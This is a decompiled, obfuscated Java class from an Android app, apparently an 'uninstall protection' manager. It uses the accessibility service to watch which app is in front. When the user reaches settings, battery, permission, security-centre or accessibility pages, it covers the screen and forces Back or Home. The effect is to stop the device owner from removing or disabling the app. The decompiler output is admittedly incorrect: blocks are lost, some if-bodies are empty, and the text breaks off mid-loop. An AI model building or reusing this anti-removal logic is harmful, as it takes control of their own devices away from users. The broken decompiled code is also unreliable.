package p000;

import android.os.Build;
import android.os.Handler;
import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.protection.C0355a0;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import kotlin.text.AbstractC0779a1;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class pk1 implements Runnable {

    /* renamed from: a0 */
    public final /* synthetic */ int f59300a0;

    /* renamed from: a1 */
    public final /* synthetic */ C0355a0 f59301a1;

    public /* synthetic */ pk1(C0355a0 c0355a0, int i) {
        this.f59300a0 = i;
        this.f59301a1 = c0355a0;
    }

    /* JADX WARN: Can't wrap try/catch for region: R(14:462|18|19|(7:21|455|22|(1:24)|34|482|(5:42|391|470|392|393)(2:43|(2:45|(4:47|458|48|49)(4:50|474|51|52))(29:53|54|(9:441|58|59|460|60|(1:550)(2:64|548)|65|55|56)|547|72|466|73|74|(1:(2:76|(1:552)(1:79))(2:551|80))|81|(8:537|83|84|533|85|86|(1:(4:88|535|89|(1:571)(1:92))(2:570|97))|(7:99|100|545|101|507|102|103)(1:113))(1:119)|114|478|120|121|(3:445|123|(2:125|(1:127)))|525|136|(2:137|(2:139|(2:567|141)(1:142))(2:566|143))|144|(7:146|147|451|148|453|149|150)(12:155|(2:156|(2:158|(2:569|160)(1:161))(2:568|162))|163|(8:521|165|166|509|167|511|168|169)(27:130|517|175|176|(3:505|178|(18:190|(0)(1:193)|194|513|244|(4:254|(2:255|(2:257|(2:561|259)(1:260))(2:560|261))|262|(14:491|264|(5:266|267|(1:(2:269|(2:563|271)(1:272))(2:562|273))|274|(7:276|277|493|278|446|279|280)(1:285))|495|286|(4:288|289|(7:291|485|292|(1:296)(11:523|298|299|527|300|(7:456|303|501|304|559|558|301)|557|309|(1:311)|312|(13:476|314|(13:316|487|317|(0)(1:326)|(6:334|499|335|336|497|337)(1:339)|340|(1:342)(1:344)|343|464|346|529|347|348)(1:330)|332|(0)(0)|340|(0)(0)|343|464|346|529|347|348)(0))|297|356|555)(2:358|556)|357)|554|364|365|503|366|367|417|418))|253|495|286|(0)|554|364|365|503|366|367|417|418))|197|(2:198|(6:443|200|201|449|202|(1:205)(0))(2:553|211))|194|513|244|(1:246)|254|(3:255|(0)(0)|260)|262|(0)|253|495|286|(0)|554|364|365|503|366|367|417|418)|174|154|135|514|414|(2:489|416)|417|418)|153|154|135|514|414|(0)|417|418)))(1:32)|31|33|34|482|(1:36)|42|391|470|392|393) */
    /* JADX WARN: Can't wrap try/catch for region: R(21:(3:517|175|176)|(3:505|178|(18:190|(0)(1:193)|194|513|244|(4:254|(2:255|(2:257|(2:561|259)(1:260))(2:560|261))|262|(14:491|264|(5:266|267|(1:(2:269|(2:563|271)(1:272))(2:562|273))|274|(7:276|277|493|278|446|279|280)(1:285))|495|286|(4:288|289|(7:291|485|292|(1:296)(11:523|298|299|527|300|(7:456|303|501|304|559|558|301)|557|309|(1:311)|312|(13:476|314|(13:316|487|317|(0)(1:326)|(6:334|499|335|336|497|337)(1:339)|340|(1:342)(1:344)|343|464|346|529|347|348)(1:330)|332|(0)(0)|340|(0)(0)|343|464|346|529|347|348)(0))|297|356|555)(2:358|556)|357)|554|364|365|503|366|367|417|418))|253|495|286|(0)|554|364|365|503|366|367|417|418))|513|244|(1:246)|254|(3:255|(0)(0)|260)|262|(0)|253|495|286|(0)|554|364|365|503|366|367|417|418) */
    /* JADX WARN: Can't wrap try/catch for region: R(27:130|517|175|176|(3:505|178|(18:190|(0)(1:193)|194|513|244|(4:254|(2:255|(2:257|(2:561|259)(1:260))(2:560|261))|262|(14:491|264|(5:266|267|(1:(2:269|(2:563|271)(1:272))(2:562|273))|274|(7:276|277|493|278|446|279|280)(1:285))|495|286|(4:288|289|(7:291|485|292|(1:296)(11:523|298|299|527|300|(7:456|303|501|304|559|558|301)|557|309|(1:311)|312|(13:476|314|(13:316|487|317|(0)(1:326)|(6:334|499|335|336|497|337)(1:339)|340|(1:342)(1:344)|343|464|346|529|347|348)(1:330)|332|(0)(0)|340|(0)(0)|343|464|346|529|347|348)(0))|297|356|555)(2:358|556)|357)|554|364|365|503|366|367|417|418))|253|495|286|(0)|554|364|365|503|366|367|417|418))|197|(2:198|(6:443|200|201|449|202|(1:205)(0))(2:553|211))|194|513|244|(1:246)|254|(3:255|(0)(0)|260)|262|(0)|253|495|286|(0)|554|364|365|503|366|367|417|418) */
    /* JADX WARN: Code restructure failed: missing block: B:128:0x02e0, code lost:
    
        if (com.storm.safe.rock.service.modules.protection.C0355a0.m211934d7(r8) == false) goto L130;
     */
    /* JADX WARN: Code restructure failed: missing block: B:212:0x0473, code lost:
    
        r7 = (java.lang.String) r20;
     */
    /* JADX WARN: Code restructure failed: missing block: B:213:0x0477, code lost:
    
        if (r7 == null) goto L243;
     */
    /* JADX WARN: Code restructure failed: missing block: B:215:0x047d, code lost:
    
        if (r6.isEmpty() != false) goto L243;
     */
    /* JADX WARN: Code restructure failed: missing block: B:216:0x047f, code lost:
    
        r12 = r6.size();
     */
    /* JADX WARN: Code restructure failed: missing block: B:217:0x0483, code lost:
    
        r20 = r9;
        r9 = 0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:218:0x0486, code lost:
    
        if (r9 >= r12) goto L564;
     */
    /* JADX WARN: Code restructure failed: missing block: B:219:0x0488, code lost:
    
        r21 = r6.get(r9);
        r9 = r9 + 1;
        r22 = r12;
     */
    /* JADX WARN: Code restructure failed: missing block: B:220:0x04a3, code lost:
    
        if (kotlin.text.AbstractC0779a1.m213652a5(r4, kotlin.text.AbstractC0779a1.m213687e0((java.lang.String) r21).toString(), true) == false) goto L222;
     */
    /* JADX WARN: Code restructure failed: missing block: B:222:0x04a6, code lost:
    
        r12 = r22;
        r9 = r9;
     */
    /* JADX WARN: Code restructure failed: missing block: B:223:0x04ab, code lost:
    
        r0 = th;
     */
    /* JADX WARN: Code restructure failed: missing block: B:224:0x04ac, code lost:
    
        r6 = r20;
     */
    /* JADX WARN: Code restructure failed: missing block: B:225:0x04b2, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:226:0x04b3, code lost:
    
        r1 = r41;
        r3 = r2;
        r20 = r20;
     */
    /* JADX WARN: Code restructure failed: missing block: B:228:0x04b9, code lost:
    
        r21 = null;
     */
    /* JADX WARN: Code restructure failed: missing block: B:229:0x04bb, code lost:
    
        r9 = (java.lang.String) r21;
        r20 = r20;
     */
    /* JADX WARN: Code restructure failed: missing block: B:230:0x04bf, code lost:
    
        if (r9 == null) goto L194;
     */
    /* JADX WARN: Code restructure failed: missing block: B:231:0x04c1, code lost:
    
        p000.t60.m214726f4("UninstallProtectionMgr", "🛡️⚡ [轮询#" + r2.f53700d5 + "] ✅ 耗电/电池页: " + r7 + " + " + r9 + " → 遮挡+返回!");
        r2.m211951e5();
        r16.postAtFrontOfQueue(new p000.nk1(r2, 9));
        com.storm.safe.rock.service.modules.protection.C0355a0.m211925c4(r2);
     */
    /* JADX WARN: Code restructure failed: missing block: B:232:0x0508, code lost:
    
        r3 = r2;
     */
    /* JADX WARN: Code restructure failed: missing block: B:233:0x0509, code lost:
    
        r3.m211945d9("POLLING_BATTERY_UI", "轮询-耗电页拦截", p000.AbstractC0716jf.m213306g5(r8, r7, r9), "遮挡+返回", r8);
     */
    /* JADX WARN: Code restructure failed: missing block: B:234:0x050c, code lost:
    
        r20.recycle();
     */
    /* JADX WARN: Code restructure failed: missing block: B:235:0x050f, code lost:
    
        return;
     */
    /* JADX WARN: Code restructure failed: missing block: B:236:0x0510, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:239:0x0515, code lost:
    
        r0 = th;
     */
    /* JADX WARN: Code restructure failed: missing block: B:240:0x0516, code lost:
    
        r20 = r9;
     */
    /* JADX WARN: Code restructure failed: missing block: B:241:0x0519, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:242:0x051a, code lost:
    
        r20 = r9;
     */
    /* JADX WARN: Code restructure failed: missing block: B:243:0x051d, code lost:
    
        r20 = r9;
     */
    /* JADX WARN: Code restructure failed: missing block: B:361:0x0785, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:362:0x0786, code lost:
    
        r1 = r20;
     */
    /* JADX WARN: Code restructure failed: missing block: B:368:0x07bf, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:370:0x07c1, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:371:0x07c2, code lost:
    
        r3 = r2;
     */
    /* JADX WARN: Code restructure failed: missing block: B:374:0x07c7, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:375:0x07c8, code lost:
    
        r3 = r2;
        r1 = r9;
     */
    /* JADX WARN: Code restructure failed: missing block: B:421:0x0886, code lost:
    
        r6.recycle();
     */
    /* JADX WARN: Code restructure failed: missing block: B:577:?, code lost:
    
        return;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:257:0x0550 A[Catch: all -> 0x04ab, Exception -> 0x04b2, TRY_ENTER, TRY_LEAVE, TryCatch #5 {all -> 0x04ab, blocks: (B:246:0x0527, B:248:0x052d, B:250:0x0533, B:257:0x0550, B:264:0x056d, B:266:0x0573, B:269:0x057c, B:274:0x05a6, B:276:0x05ac, B:278:0x05f2, B:219:0x0488, B:229:0x04bb, B:231:0x04c1, B:233:0x0509), top: B:448:0x0488 }] */
    /* JADX WARN: Removed duplicated region for block: B:288:0x0643 A[Catch: all -> 0x0781, Exception -> 0x0785, TRY_LEAVE, TryCatch #34 {Exception -> 0x0785, blocks: (B:286:0x0601, B:288:0x0643), top: B:495:0x0601 }] */
    /* JADX WARN: Removed duplicated region for block: B:330:0x0709  */
    /* JADX WARN: Removed duplicated region for block: B:334:0x0712  */
    /* JADX WARN: Removed duplicated region for block: B:339:0x0721  */
    /* JADX WARN: Removed duplicated region for block: B:342:0x0736  */
    /* JADX WARN: Removed duplicated region for block: B:344:0x073f  */
    /* JADX WARN: Removed duplicated region for block: B:480:0x0886 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:489:0x087c A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:491:0x056d A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:560:0x0568 A[SYNTHETIC] */
    /* JADX WARN: Type inference failed for: r11v11, types: [java.lang.Object] */
    /* JADX WARN: Type inference failed for: r11v8, types: [java.lang.Object] */
    /* JADX WARN: Type inference failed for: r20v10 */
    /* JADX WARN: Type inference failed for: r20v25 */
    /* JADX WARN: Type inference failed for: r20v26 */
    /* JADX WARN: Type inference failed for: r20v27 */
    /* JADX WARN: Type inference failed for: r20v28 */
    /* JADX WARN: Type inference failed for: r20v29, types: [android.view.accessibility.AccessibilityNodeInfo] */
    /* JADX WARN: Type inference failed for: r20v3 */
    /* JADX WARN: Type inference failed for: r20v30 */
    /* JADX WARN: Type inference failed for: r20v32 */
    /* JADX WARN: Type inference failed for: r20v33 */
    /* JADX WARN: Type inference failed for: r20v34 */
    /* JADX WARN: Type inference failed for: r20v5 */
    /* JADX WARN: Type inference failed for: r20v6, types: [android.view.accessibility.AccessibilityNodeInfo] */
    /* JADX WARN: Type inference failed for: r20v7 */
    /* JADX WARN: Type inference failed for: r20v8 */
    /* JADX WARN: Type inference failed for: r20v9 */
    /* JADX WARN: Type inference failed for: r21v4, types: [java.lang.Object] */
    /* JADX WARN: Type inference failed for: r6v10 */
    /* JADX WARN: Type inference failed for: r6v11 */
    /* JADX WARN: Type inference failed for: r6v19 */
    /* JADX WARN: Type inference failed for: r6v21 */
    /* JADX WARN: Type inference failed for: r6v4 */
    /* JADX WARN: Type inference failed for: r6v5, types: [android.view.accessibility.AccessibilityNodeInfo] */
    /* JADX WARN: Type inference failed for: r6v55 */
    /* JADX WARN: Type inference failed for: r6v59 */
    /* JADX WARN: Type inference failed for: r6v6, types: [android.view.accessibility.AccessibilityNodeInfo] */
    /* JADX WARN: Type inference failed for: r6v66 */
    /* JADX WARN: Type inference failed for: r6v67 */
    /* JADX WARN: Type inference failed for: r6v68 */
    /* JADX WARN: Type inference failed for: r6v69 */
    /* JADX WARN: Type inference failed for: r6v7 */
    /* JADX WARN: Type inference failed for: r6v70 */
    /* JADX WARN: Type inference failed for: r6v8 */
    /* JADX WARN: Type inference failed for: r6v9 */
    /* JADX WARN: Type inference failed for: r7v47, types: [android.view.accessibility.AccessibilityNodeInfo] */
    /* JADX WARN: Type inference failed for: r8v2, types: [android.view.accessibility.AccessibilityNodeInfo] */
    /* JADX WARN: Type inference failed for: r9v10 */
    /* JADX WARN: Type inference failed for: r9v11, types: [android.view.accessibility.AccessibilityNodeInfo] */
    /* JADX WARN: Type inference failed for: r9v16, types: [java.lang.Object] */
    /* JADX WARN: Type inference failed for: r9v28 */
    /* JADX WARN: Type inference failed for: r9v3 */
    /* JADX WARN: Type inference failed for: r9v6 */
    /* JADX WARN: Type inference failed for: r9v8 */
    /* JADX WARN: Type inference failed for: r9v9, types: [android.view.accessibility.AccessibilityNodeInfo] */
    /* renamed from: a0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    private final void m214293a0() throws Throwable {
        long j;
        Handler handler;
        ?? r6;
        w00 w00Var;
        long j2;
        Handler handler2;
        ?? r8;
        long j3;
        Handler handler3;
        CharSequence packageName;
        boolean z;
        Handler handler4;
        String lowerCase;
        Object obj;
        C0355a0 c0355a0;
        String str;
        ?? r9;
        Object obj2;
        Object obj3;
        String str2;
        String str3;
        Object obj4;
        CharSequence charSequence;
        String str4;
        String str5;
        String str6;
        C0355a0 c0355a02;
        Object obj5;
        AccessibilityNodeInfo accessibilityNodeInfo;
        Object obj6;
        Iterator it;
        String str7;
        String str8;
        CharSequence charSequence2;
        ArrayList arrayList;
        boolean z2;
        String str9;
        Iterator it2;
        int size;
        int i;
        CharSequence charSequence3;
        AccessibilityNodeInfo accessibilityNodeInfo2;
        int i2;
        CharSequence charSequence4;
        boolean z3;
        AccessibilityNodeInfo accessibilityNodeInfo3;
        int i3;
        boolean z4;
        Object next;
        Iterator it3;
        String str10;
        pk1 pk1Var = this;
        C0355a0 c0355a03 = pk1Var.f59301a1;
        Handler handler5 = c0355a03.f53676b1;
        long j4 = c0355a03.f53688c3;
        Handler handler6 = c0355a03.f53677b2;
        if (c0355a03.f53686c1) {
            c0355a03.f53700d5++;
            long jCurrentTimeMillis = System.currentTimeMillis() - c0355a03.f53690c5;
            if (c0355a03.f53675b0.get()) {
                t60.m214702c3("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] ⏸ 跳过: 正在执行返回序列 (已运行" + jCurrentTimeMillis + "ms)");
                handler6.postDelayed(pk1Var, j4);
                return;
            }
            if (jCurrentTimeMillis > c0355a03.f53689c4) {
                t60.m214702c3("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] ⏹ 超时停止 (已运行" + jCurrentTimeMillis + "ms)");
                c0355a03.m211951e5();
                return;
            }
            try {
                try {
                    w00Var = c0355a03.f53695d0;
                } catch (Throwable th) {
                    th = th;
                }
            } catch (Exception e) {
                e = e;
                j = j4;
                handler = handler6;
            }
            if (w00Var != null) {
                try {
                    r8 = (AccessibilityNodeInfo) w00Var.invoke();
                } catch (Exception e2) {
                    e = e2;
                    j2 = j4;
                    handler2 = handler6;
                    pk1Var = this;
                    j = j2;
                    handler = handler2;
                    r6 = 0;
                    try {
                        t60.m214726f4("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] ⚠️ 异常: " + e.getMessage());
                        if (r6 != 0) {
                        }
                        handler.postDelayed(pk1Var, j);
                    } catch (Throwable th2) {
                        th = th2;
                        if (r6 != 0) {
                        }
                        throw th;
                    }
                } catch (Throwable th3) {
                    th = th3;
                    r6 = 0;
                }
                if (r8 != 0) {
                    try {
                        try {
                            packageName = r8.getPackageName();
                        } catch (Exception e3) {
                            e = e3;
                            pk1Var = r8;
                            j3 = j4;
                        }
                        try {
                            try {
                                if (packageName != null) {
                                    z = true;
                                    try {
                                        try {
                                            String string = packageName.toString();
                                            if (string != null) {
                                                handler4 = handler5;
                                                lowerCase = string.toLowerCase(Locale.ROOT);
                                                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                                            }
                                            t60.m214702c3("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] 🔍 前台包名: " + lowerCase + " (已运行" + jCurrentTimeMillis + "ms)");
                                        } catch (Throwable th4) {
                                            th = th4;
                                            r6 = r8;
                                            if (r6 != 0) {
                                            }
                                            throw th;
                                        }
                                    } catch (Exception e4) {
                                        e = e4;
                                        obj = r8;
                                        j = j4;
                                        handler = handler6;
                                        r6 = obj;
                                        t60.m214726f4("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] ⚠️ 异常: " + e.getMessage());
                                        if (r6 != 0) {
                                        }
                                        handler.postDelayed(pk1Var, j);
                                    }
                                    if (!AbstractC0779a1.m213652a5(lowerCase, "launcher", false) || AbstractC0779a1.m213652a5(lowerCase, ".home", false) || AbstractC0779a1.m213652a5(lowerCase, "hiboard", false) || AbstractC0779a1.m213652a5(lowerCase, "personalassistant", false)) {
                                        String str11 = lowerCase;
                                        t60.m214702c3("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] 🏠 已回到桌面: " + str11 + " → 停止轮询");
                                        c0355a03.m211951e5();
                                        r8.recycle();
                                        return;
                                    }
                                    String packageName2 = c0355a03.f53665a0.getPackageName();
                                    t60.m214694b5(packageName2, "context.packageName");
                                    String lowerCase2 = packageName2.toLowerCase(Locale.ROOT);
                                    t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                                    if (t60.m214686a2(lowerCase, lowerCase2)) {
                                        int i4 = c0355a03.f53701d6 + 1;
                                        c0355a03.f53701d6 = i4;
                                        if (i4 >= 3) {
                                            t60.m214702c3("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] 📱 连续" + c0355a03.f53701d6 + "次前台是自己的APP → 停止轮询");
                                            c0355a03.m211951e5();
                                            try {
                                                r8.recycle();
                                                return;
                                            } catch (Exception unused) {
                                                return;
                                            }
                                        }
                                        t60.m214702c3("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] 📱 前台是自己的APP (" + c0355a03.f53701d6 + "/3)");
                                        handler6.postDelayed(pk1Var, j4);
                                        try {
                                            r8.recycle();
                                            return;
                                        } catch (Exception unused2) {
                                            return;
                                        }
                                    }
                                    c0355a03.f53701d6 = 0;
                                    ArrayList arrayList2 = new ArrayList();
                                    C0355a0.m211924b9(0, r8, arrayList2);
                                    String strM213295i2 = AbstractC0715je.m213295i2(arrayList2, " ", null, null, null, 62);
                                    List listM211940c6 = c0355a03.m211940c6();
                                    ArrayList arrayList3 = new ArrayList();
                                    for (Object obj7 : listM211940c6) {
                                        try {
                                            str10 = (String) obj7;
                                            c0355a0 = c0355a03;
                                        } catch (Exception e5) {
                                            e = e5;
                                            obj = r8;
                                            j = j4;
                                            handler = handler6;
                                            r6 = obj;
                                            t60.m214726f4("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] ⚠️ 异常: " + e.getMessage());
                                            if (r6 != 0) {
                                            }
                                            handler.postDelayed(pk1Var, j);
                                        }
                                        try {
                                            if (AbstractC0779a1.m213687e0(str10).toString().length() >= 2 && !AbstractC0779a1.m213653a6(str10, '.')) {
                                                arrayList3.add(obj7);
                                            }
                                            c0355a03 = c0355a0;
                                        } catch (Exception e6) {
                                            e = e6;
                                            obj3 = r8;
                                            j = j4;
                                            handler = handler6;
                                            obj4 = obj3;
                                            c0355a03 = c0355a0;
                                            r6 = obj4;
                                            t60.m214726f4("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] ⚠️ 异常: " + e.getMessage());
                                            if (r6 != 0) {
                                            }
                                            handler.postDelayed(pk1Var, j);
                                        }
                                    }
                                    c0355a0 = c0355a03;
                                    try {
                                        String[] strArr = C0355a0.f53637f3;
                                        int length = strArr.length;
                                        int i5 = 0;
                                        while (true) {
                                            if (i5 >= length) {
                                                str = null;
                                                break;
                                            }
                                            str = strArr[i5];
                                            if (AbstractC0779a1.m213652a5(strM213295i2, str, z)) {
                                                break;
                                            }
                                            i5++;
                                            z = true;
                                        }
                                        if (str != null) {
                                            try {
                                                String[] strArr2 = C0355a0.f53638f4;
                                                try {
                                                    int length2 = strArr2.length;
                                                    int i6 = 0;
                                                    while (true) {
                                                        if (i6 >= length2) {
                                                            str2 = null;
                                                            break;
                                                        }
                                                        int i7 = i6;
                                                        try {
                                                            str2 = strArr2[i7];
                                                            int i8 = length2;
                                                            if (AbstractC0779a1.m213652a5(strM213295i2, str2, true)) {
                                                                break;
                                                            }
                                                            i6 = i7 + 1;
                                                            length2 = i8;
                                                        } catch (Exception e7) {
                                                            e = e7;
                                                            j = j4;
                                                            handler = handler6;
                                                            obj4 = r8;
                                                            c0355a03 = c0355a0;
                                                            r6 = obj4;
                                                            t60.m214726f4("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] ⚠️ 异常: " + e.getMessage());
                                                            if (r6 != 0) {
                                                            }
                                                            handler.postDelayed(pk1Var, j);
                                                        } catch (Throwable th5) {
                                                            th = th5;
                                                            r6 = r8;
                                                            if (r6 != 0) {
                                                            }
                                                            throw th;
                                                        }
                                                    }
                                                    if (str2 != null) {
                                                        t60.m214726f4("UninstallProtectionMgr", "🛡️⚡ [轮询#" + c0355a0.f53700d5 + "] ✅ 命中纯净模式设置页: " + str + " + " + str2 + " → 执行返回!");
                                                        c0355a0.m211951e5();
                                                        C0355a0.m211925c4(c0355a0);
                                                        StringBuilder sb = new StringBuilder();
                                                        sb.append(str);
                                                        sb.append("+");
                                                        sb.append(str2);
                                                        List listM213306g5 = AbstractC0716jf.m213306g5(lowerCase, sb.toString());
                                                        String str12 = lowerCase;
                                                        r9 = r8;
                                                        c0355a03 = c0355a0;
                                                        try {
                                                            c0355a03.m211945d9("POLLING_PURE_MODE", "轮询-纯净模式设置页拦截", listM213306g5, "返回+HOME", str12);
                                                            try {
                                                                r9.recycle();
                                                                return;
                                                            } catch (Exception unused3) {
                                                                return;
                                                            }
                                                        } catch (Exception e8) {
                                                            e = e8;
                                                            obj = r9;
                                                            j = j4;
                                                            handler = handler6;
                                                            r6 = obj;
                                                            t60.m214726f4("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] ⚠️ 异常: " + e.getMessage());
                                                            if (r6 != 0) {
                                                            }
                                                            handler.postDelayed(pk1Var, j);
                                                        } catch (Throwable th6) {
                                                            th = th6;
                                                            r6 = r9;
                                                            if (r6 != 0) {
                                                            }
                                                            throw th;
                                                        }
                                                    }
                                                    str3 = lowerCase;
                                                    r9 = r8;
                                                } catch (Exception e9) {
                                                    e = e9;
                                                    obj2 = r8;
                                                    obj3 = obj2;
                                                    j = j4;
                                                    handler = handler6;
                                                    obj4 = obj3;
                                                    c0355a03 = c0355a0;
                                                    r6 = obj4;
                                                    t60.m214726f4("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] ⚠️ 异常: " + e.getMessage());
                                                    if (r6 != 0) {
                                                    }
                                                    handler.postDelayed(pk1Var, j);
                                                } catch (Throwable th7) {
                                                    th = th7;
                                                    r9 = r8;
                                                }
                                            } catch (Exception e10) {
                                                e = e10;
                                                obj2 = r8;
                                            } catch (Throwable th8) {
                                                th = th8;
                                                r9 = r8;
                                            }
                                        } else {
                                            String str13 = lowerCase;
                                            r9 = r8;
                                            str3 = str13;
                                        }
                                        charSequence = "settings";
                                    } catch (Exception e11) {
                                        e = e11;
                                        pk1Var = r8;
                                    }
                                    try {
                                        try {
                                            j3 = j4;
                                            if (!AbstractC0779a1.m213652a5(str3, charSequence, false)) {
                                                try {
                                                    try {
                                                        if (!AbstractC0779a1.m213652a5(str3, "safecenter", false)) {
                                                            if (!AbstractC0779a1.m213652a5(str3, "securitycenter", false)) {
                                                            }
                                                        }
                                                    } catch (Exception e12) {
                                                        e = e12;
                                                        pk1Var = this;
                                                        obj5 = r9;
                                                        handler = handler6;
                                                        c0355a03 = c0355a0;
                                                    }
                                                } catch (Throwable th9) {
                                                    th = th9;
                                                    r6 = r9;
                                                    if (r6 != 0) {
                                                    }
                                                    throw th;
                                                }
                                            }
                                        } catch (Throwable th10) {
                                            th = th10;
                                            pk1Var = r9;
                                        }
                                    } catch (Exception e13) {
                                        e = e13;
                                        pk1Var = r9;
                                        j3 = j4;
                                        handler3 = handler6;
                                        c0355a03 = c0355a0;
                                        r6 = pk1Var;
                                        j = j3;
                                        handler = handler3;
                                        pk1Var = this;
                                        t60.m214726f4("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] ⚠️ 异常: " + e.getMessage());
                                        if (r6 != 0) {
                                        }
                                        handler.postDelayed(pk1Var, j);
                                    }
                                    try {
                                        Iterator it4 = dh0.m212604a3().iterator();
                                        while (true) {
                                            if (!it4.hasNext()) {
                                                str4 = null;
                                                break;
                                            }
                                            ?? next2 = it4.next();
                                            Iterator it5 = it4;
                                            if (AbstractC0779a1.m213652a5(strM213295i2, (String) next2, true)) {
                                                str4 = next2;
                                                break;
                                            }
                                            it4 = it5;
                                        }
                                        str5 = str4;
                                    } catch (Exception e14) {
                                        e = e14;
                                        pk1Var = r9;
                                        handler3 = handler6;
                                        c0355a03 = c0355a0;
                                        r6 = pk1Var;
                                        j = j3;
                                        handler = handler3;
                                        pk1Var = this;
                                        t60.m214726f4("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] ⚠️ 异常: " + e.getMessage());
                                        if (r6 != 0) {
                                        }
                                        handler.postDelayed(pk1Var, j);
                                    }
                                    if (str5 == null) {
                                        Iterator it6 = dh0.m212601a0().iterator();
                                        while (true) {
                                            if (!it6.hasNext()) {
                                                str6 = null;
                                                break;
                                            }
                                            ?? next3 = it6.next();
                                            Iterator it7 = it6;
                                            if (AbstractC0779a1.m213652a5(strM213295i2, (String) next3, true)) {
                                                str6 = next3;
                                                break;
                                            }
                                            it6 = it7;
                                        }
                                        String str14 = str6;
                                        if (str14 != null) {
                                            try {
                                                t60.m214726f4("UninstallProtectionMgr", "🛡️⚡ [轮询#" + c0355a0.f53700d5 + "] ✅ 命中无障碍关键词: " + str14 + " → 执行返回!");
                                                c0355a0.m211951e5();
                                                C0355a0.m211925c4(c0355a0);
                                                c0355a03 = c0355a0;
                                                try {
                                                    c0355a03.m211945d9("POLLING_HIGH_RISK", "轮询-无障碍关键词", AbstractC0716jf.m213306g5(str3, str14), "返回+HOME", str3);
                                                    try {
                                                        r9.recycle();
                                                        return;
                                                    } catch (Exception unused4) {
                                                        return;
                                                    }
                                                } catch (Exception e15) {
                                                    e = e15;
                                                }
                                            } catch (Exception e16) {
                                                e = e16;
                                                c0355a02 = c0355a0;
                                            }
                                        } else {
                                            c0355a02 = c0355a0;
                                            try {
                                                try {
                                                } catch (Exception e17) {
                                                    e = e17;
                                                    c0355a03 = c0355a02;
                                                    pk1Var = r9;
                                                    handler3 = handler6;
                                                    r6 = pk1Var;
                                                    j = j3;
                                                    handler = handler3;
                                                    pk1Var = this;
                                                    t60.m214726f4("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] ⚠️ 异常: " + e.getMessage());
                                                    if (r6 != 0) {
                                                    }
                                                    handler.postDelayed(pk1Var, j);
                                                }
                                                if (!AbstractC0779a1.m213652a5(str3, charSequence, false)) {
                                                    try {
                                                    } catch (Exception e18) {
                                                        e = e18;
                                                    }
                                                    if (!AbstractC0779a1.m213652a5(str3, "permissioncontroller", false) && !AbstractC0779a1.m213652a5(str3, "battery", false) && !AbstractC0779a1.m213652a5(str3, "powermanager", false) && !AbstractC0779a1.m213652a5(str3, "powersaving", false) && !AbstractC0779a1.m213652a5(str3, "safecenter", false) && !AbstractC0779a1.m213652a5(str3, "securitycenter", false)) {
                                                        if (!C0355a0.m211934d7(str3)) {
                                                            accessibilityNodeInfo = r9;
                                                            handler3 = handler6;
                                                        }
                                                        Handler handler7 = handler4;
                                                        if (!AbstractC0779a1.m213652a5(str3, charSequence, false) || AbstractC0779a1.m213652a5(str3, "safecenter", false) || AbstractC0779a1.m213652a5(str3, "securitycenter", false) || C0355a0.m211934d7(str3)) {
                                                            it = dh0.m212603a2().iterator();
                                                            while (true) {
                                                                if (it.hasNext()) {
                                                                    str7 = null;
                                                                    break;
                                                                }
                                                                ?? next4 = it.next();
                                                                it2 = it;
                                                                if (AbstractC0779a1.m213652a5(strM213295i2, (String) next4, true)) {
                                                                    str7 = next4;
                                                                    break;
                                                                }
                                                                it = it2;
                                                            }
                                                            str8 = str7;
                                                            if (str8 != null) {
                                                                try {
                                                                    if (!arrayList3.isEmpty()) {
                                                                        int size2 = arrayList3.size();
                                                                        charSequence2 = "securitycenter";
                                                                        int i9 = 0;
                                                                        while (true) {
                                                                            if (i9 >= size2) {
                                                                                arrayList = arrayList3;
                                                                                z2 = true;
                                                                                str9 = null;
                                                                                break;
                                                                            }
                                                                            ?? r21 = arrayList3.get(i9);
                                                                            int i10 = i9 + 1;
                                                                            arrayList = arrayList3;
